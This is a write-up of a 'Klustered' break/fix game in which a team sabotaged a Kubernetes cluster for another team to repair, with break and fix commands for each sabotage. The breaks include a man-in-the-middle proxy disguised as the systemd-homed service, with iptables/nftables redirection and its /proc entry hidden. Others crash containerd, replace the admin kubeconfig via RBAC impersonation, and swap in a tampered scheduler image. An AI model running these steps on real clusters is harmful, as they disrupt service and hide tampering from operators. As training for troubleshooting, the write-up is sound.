# CrashBeerBackOff Klustered 2022/08/11

Writeup of our klustered session against Jetstack

# Breaks

<!-- TOC -->

1. [No executable permission on chmod and kubectl](#no-executable-permission-on-chmod-and-kubectl)
2. [Break containerd](#break-containerd)
3. [Man-in-the-middle](#man-in-the-middle)
4. [Remove kubernetes admin from system](#remove-kubernetes-admin-from-system)
5. [Disable deployment controller](#disable-deployment-controller)
6. [Default scheduler name changed.](#default-scheduler-name-changed)
<!-- TOC -->

## No executable permission on chmod and kubectl

Missing executable permission on `kubectl` and `chmod`. You may get ask this in job interviews.

### Break

```bash
chmod -x "$(which kubectl)"
chmod -x "$(which chmod)"
```

### Fix

```bash
/lib64/ld-linux-x86-64.so.2 /usr/bin/chmod +x /usr/bin/chmod
chmod +x "$(which kubectl)"
```

## Break containerd

For unknown reasons, if the containerd setting `max_container_log_line_size` is set to a low value like `10`,
the containerd process raises go panics and dies.

Usually, if containerd is crashing, no running pods of the same cgroup are affected.
We modified this default behavior of systemd, to kill the whole process group, if containerd dies.
By removing the line `KillMode=process` from the containerd unit file, systemd now kills all running containers if containerd dies.
We also add `KillSignal=SIGKILL` to make this behavior more consistent.

### Break

```bash
mkdir -p /etc/containerd

# shellcheck disable=SC2016
cat << EOF > /etc/containerd/config.toml
version = 2

[plugins."io.containerd.grpc.v1.cri"]
  max_container_log_line_size = 10
EOF

sed -i 's/KillMode=process/KillSignal=SIGKILL/' /lib/systemd/system/containerd.service

systemctl daemon-reload
systemctl stop containerd
systemctl start containerd
```

### Fix

Simply remove the config.toml to resolve the issue.

```bash
rm -f /etc/containerd/config.toml
systemctl restart containerd
```

## Man-in-the-middle

Custom written MITM proxy for mutating all http requests between local `kubectl` and the `api-server`.
The proxy injects the `dry-run` flag in every HTTP request. Which prevents persistent changes to any manifest.
Traffic is redirect through kernel technics. We thought, just having `iptables` is a bit too easy.
In addition to `iptables` we also use the newer `nftables` framework to redirect the traffic.
Since the mitm-process itself is not part of the break/fix, we mask the `/proc/$PID/` path of the process to hide it.
The process is named systemd-homed and covered by systemd which makes the whole break reboot-safe.
The MITM Proxy re-uses the TLS service from the apiserver to serve a valid https listener.
We hardcoded the client certificate of the kubernetes admin user as an obfuscated string.

### Break

```ini
; /lib/systemd/system/systemd-homed.service
[Unit]
Description=Home Area Manager
Documentation=man:systemd-homed.service(8)
Documentation=man:org.freedesktop.home1(5)
After=home.mount dbus.service

[Service]
ExecStart=/usr/bin/systemd-homed
Restart=always
RestartSec=0
StandardOutput=null
StandardError=null

ExecStartPre=-/bin/bash -c 'iptables -t nat -nL OUTPUT | grep 853 && iptables -t nat -A OUTPUT ! -d 127.0.0.53/32 -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
ExecStartPre=-/bin/bash -c 'iptables -t nat -nL PREROUTING | grep 853 && iptables -t nat -A PREROUTING ! -d 127.0.0.53/32 -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
ExecStartPre=-/bin/bash -c 'ip6tables -t nat -nL OUTPUT | grep 853 && ip6tables -t nat -A PREROUTING -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
ExecStartPre=-/bin/bash -c 'ip6tables -t nat -nL PREROUTING | grep 853 && ip6tables -t nat -A OUTPUT -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
ExecStartPre=/bin/bash -c "printf 'flush ruleset; table ip nat { chain prerouting { type nat hook prerouting priority 0; policy accept; ip daddr != 127.0.0.53 tcp dport 6443 dnat to :853; }; chain postrouting { type nat hook postrouting priority 100; policy accept; }; chain output { type nat hook output priority 100; policy accept; ip daddr != 127.0.0.53 tcp dport 853 dnat to :2222; };};' | nft -f -"
ExecStartPre=/bin/bash -c 'umount -q /proc/*'
ExecStartPost=/bin/bash -c 'mount -o bind /proc/fs/nfsd/ /proc/$(pidof systemd-homed)/'

[Install]
WantedBy=multi-user.target
```

```bash
apt update -qq
apt install nftables -yqq
sysctl -w net.ipv4.conf.all.route_localnet=1 >> /etc/sysctl.d/99-sysctl.conf
sysctl -w net.ipv4.conf.default.route_localnet=1 >> /etc/sysctl.d/99-sysctl.conf
echo 1 | tee /proc/sys/net/ipv4/conf/*/route_localnet
systemctl enable --now systemd-homed.service
```

### Fix

```bash
iptables -t nat -D OUTPUT 2
nft flush ruleset
```

## Remove kubernetes admin from system

This break removes the kubernetes admin user from the system, e.g. `/etc/kubernetes/admin.conf`.
We created a new users which has the permission to impersonate the group `system:masters`.
This break is visible **after** solving the MITM-Proxy break, since the MITM proxy uses the system admin client certificate for each request.

### Break

Apply RBAC roles:

```yaml
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: imposter
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: imposter
subjects:
  - apiGroup: rbac.authorization.k8s.io
    kind: User
    name: kubernetes-admins
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: imposter
rules:
  - apiGroups: [""]
    resources: ["groups"]
    verbs: ["impersonate"]
    resourceNames: ["system:masters"]
  - apiGroups: [""]
    resources: ["users"]
    verbs: ["impersonate"]
    resourceNames: ["kubernetes-admins"]
```

```bash
# Setup Client Config
kubeadm kubeconfig user --client-name kubernetes-admins \
  --config=<(kubectl --kubeconfig=/etc/kubernetes/admin.conf -n kube-system get cm kubeadm-config -o go-template='{{ .data.ClusterConfiguration }}') \
  > /etc/kubernetes/admin.conf

# Copy modified client config
cp /etc/kubernetes/admin.conf ~/.kube/config
```

### Workaround

Work with an impersonate option `--as-group` and `--as` in `kubectl`.

```bash
kubectl --as-group=system:masters --as=kubernetes-admins get po
```

### Fix

Generate a new kubeconfig with `kubeadm`.

```bash
kubeadm kubeconfig user --client-name kubernetes-admin --org system:masters \
  --config=<(kubeadm config print init-defaults) \
  > /etc/kubernetes/admin.conf

# Fix cluster endpoint inside generated admin.conf (alternatively use vim to edit the file manually)
sed -i "s/advertiseAddress: .*/advertiseAddress: $(hostname -I)/" /etc/kubernetes/admin.conf
```

## Disable deployment controller
The kube-controller-manager manages the deployment controller, which we switched off.
The deployment tries to create a replicaset based on the template inside the controller.
If the deployment controller is turned off, no new replicaset will spawn.

### Break

```bash
sed -i 's#--controllers=*,bootstrapsigner,tokencleaner#--controllers=*,bootstrapsigner,-deployment,tokencleaner#' /etc/kubernetes/manifests/kube-controller-manager.yaml
```

### Fix

- edit `/etc/kubernetes/manifests/kube-controller-manager.yaml`
- remove `-deployment,` from `--controllers` argument

## Default scheduler name changed.

We replaced the default scheduler image by a customized image.
The image contains a configuration for the kube-scheduler to change its own name to a different one.
This leads to a missing placement strategy for pods.

### Break

[Build](kube-scheduler/Dockerfile) and publish the image.

```bash
ctr --namespace=k8s.io images pull ghcr.io/jkroepke/klustered/kube-scheduler:latest
ctr --namespace=k8s.io images tag --force ghcr.io/jkroepke/klustered/kube-scheduler:v1.23.3 k8s.gcr.io/kube-scheduler:v1.23.3
ctr --namespace=k8s.io images rm ghcr.io/jkroepke/klustered/kube-scheduler:latest
sleep 2
crictl -r unix:///run/containerd/containerd.sock rmp -f "$(crictl -r unix:///run/containerd/containerd.sock pods | grep kube-scheduler | cut -d' ' -f1)"
```

### Workaround

Manually set the nodeName inside the podTemplate of the deployment.

### Fix

Pull the image from upstream.

```bash
ctr --namespace=k8s.io images pull k8s.gcr.io/kube-scheduler:v1.23.3
```

and restart the kube-scheduler
